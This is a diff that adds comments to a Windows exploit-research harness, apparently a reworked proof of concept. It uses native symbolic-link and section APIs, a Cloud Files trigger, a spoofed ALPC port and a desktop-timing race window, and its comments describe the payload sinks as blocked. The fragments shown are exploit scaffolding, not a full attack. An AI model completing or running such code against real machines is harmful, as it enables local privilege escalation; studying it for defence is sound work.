@@ -12,6 +12,7 @@
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "advapi32.lib")
 
+// Local compatibility constants and PoC defaults.
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
@@ -69,6 +70,7 @@
 #define GP_OBJECT_TYPE_INFORMATION_CLASS 2
 #define GP_VIEW_SHARE 1
 
+// Native API declarations resolved at runtime.
 typedef NTSTATUS(WINAPI* PFN_NtCreateSymbolicLinkObject)(
     OUT PHANDLE pHandle,
     IN ACCESS_MASK DesiredAccess,
@@ -199,6 +201,7 @@ struct GpBlockedSinkResult {
     GpStatus preconditionStatus;
 };
 
+// Runtime API pointers and non-operational sink request markers.
 static PFN_NtCreateSymbolicLinkObject _NtCreateSymbolicLinkObject = NULL;
 static PFN_NtOpenSection _NtOpenSection = NULL;
 static PFN_NtDeleteKey _NtDeleteKey = NULL;
@@ -210,6 +213,7 @@ static PFN_CfAbortOperation CfAbortOperation = NULL;
 static const wchar_t GP_ALPC_PORT_NAME[] = L"\\RPC Control\\GreenPlasmaSpoofedPort";
 static const wchar_t GP_BLOCKED_DLL_REQUEST[] = L"<blocked-dll-load-request>";
 
+// Hypothesis layout for path-like state mutation. This is not a verified CTF schema.
 #pragma pack(push, 1)
 typedef struct _CTF_CACHE_LAYOUT_HYPOTHESIS {
     ULONG Version;
@@ -219,6 +223,7 @@ typedef struct _CTF_CACHE_LAYOUT_HYPOTHESIS {
 } CTF_CACHE_LAYOUT_HYPOTHESIS, *PCTF_CACHE_LAYOUT_HYPOTHESIS;
 #pragma pack(pop)
 
+// Output helpers. Default output is concise; verbose trace keeps timestamps and snapshots.
 static void PrintTimestamp(const wchar_t* phase)
 {
 #if GP_VERBOSE_TRACE
@@ -318,6 +323,7 @@ static const wchar_t* GpMapModeName(GpMapMode mode)
     }
 }
 
+// API resolution and Cloud Files trigger wrapper.
 static bool ResolveNativeApis()
 {
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
@@ -364,6 +370,7 @@ static DWORD CallCfAbortOperation(const wchar_t* phase)
     return res;
 }
 
+// Optional object and registry inspection helpers.
 static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
 {
 #if GP_VERBOSE_TRACE
@@ -583,6 +590,7 @@ static void LogRegistryState(const wchar_t* phase)
 #endif
 }
 
+// Section acquisition and registry transition helpers.
 static bool OpenSectionWithTimeout(
     POBJECT_ATTRIBUTES objattr,
     HANDLE* sectionHandle,
@@ -861,6 +869,7 @@ cleanup:
     goto exit;
 }
 
+// Section mapping, compact fingerprinting, and optional prefix dump.
 static GpSectionView MapSectionView(HANDLE section)
 {
     GpSectionView view = { 0 };
@@ -968,6 +977,7 @@ static void CaptureSectionFingerprint(GpRunEvidence* run)
         GpMapModeName(run->view.mode));
 }
 
+// ALPC primary-path hypothesis. This records only a controlled path-like mutation.
 static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
 {
     if (!run) {
@@ -1024,6 +1034,7 @@ static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
     return run->alpc.verified;
 }
 
+// Desktop transition timing oracle based on the original PoC's OpenInputDesktop loop.
 static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
 {
     GpDesktopTimingEvidence timing = { 0 };
@@ -1069,6 +1080,7 @@ static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
     }
 }
 
+// Placeholder preconditions and blocked sink boundaries.
 static GpStatus PrimitivePrecondition(const GpRunEvidence& evidence)
 {
     if (!evidence.sectionHandle) {
